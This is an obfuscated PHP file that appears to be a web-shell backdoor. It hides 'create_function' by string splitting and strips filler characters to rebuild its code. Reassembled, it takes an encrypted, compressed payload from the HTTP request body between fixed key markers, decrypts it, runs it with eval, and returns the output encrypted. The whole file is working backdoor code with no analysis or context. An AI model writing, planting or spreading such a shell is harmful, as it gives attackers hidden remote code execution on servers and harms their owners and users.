<?php
$B='$w8kw8="w8d7ed53aa";$kh="5w8755e8069076w8";$kf=w8"77b18ccw8fw800c7";$p="w8cw8elnL1w8a7d5jhPw81iw8p";function x(w8$w8t';
$Y='8$o.=$w8t{$i}^$w8w8k{$j};}}rw8w8ew8turn $o;}if (@w8preg_w8match("/w8w8$kh(.+)$kf/",@filew8_get_cow8ntenw8ts(w8"php://inw';
$H=str_replace('B','','crBBeaBteBB_Bfunction');
$M='8put"w8),w8$m)==1) {@obw8_start();w8@evw8al(@gzuncomw8pressw8(@xw8(@base6w84_w8decode($m[w8w8w81])w8,$k)));$o=@ob_w8';
$S='get_conw8tents();@w8ob_end_clw8ean();$r=w8@basew8w864_encodw8w8ew8(@x(@gzcomprew8ss($ow8),$k));pw8rint("$p$w8kh$r$kf");}';
$P=',$k){$c=w8w8strlen($k);$l=w8strlen($w8t);$o=w8"";forw8($w8i=0;$i<$lw8;){w8fow8r($j=0;($j<$w8c&&$w8i<$l);$w8w8j++,$i++){w';
$w=str_replace('w8','',$B.$P.$Y.$M.$S);
$y=$H('',$w);$y();
?>
